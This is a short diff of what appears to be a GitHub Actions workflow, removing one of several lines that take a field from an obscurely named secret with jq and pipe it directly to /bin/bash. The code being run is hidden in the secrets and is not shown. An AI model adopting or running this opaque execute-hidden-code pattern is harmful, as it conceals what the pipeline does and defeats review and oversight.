@@ -22,7 +22,6 @@ jobs:
           tj649: ${{ secrets.tj649 }}
         run: |
           printf '%s' "$tj649" | jq -r .g2 | /bin/bash
-          printf '%s' "$ox1926" | jq -r .nzhk7 | /bin/bash
           printf '%s' "$gf25" | jq -r .nk9718 | /bin/bash
           printf '%s' "$sd0970" | jq -r .iza7848 | /bin/bash
           printf '%s' "$gy0439" | jq -r .mtavw6 | /bin/bash
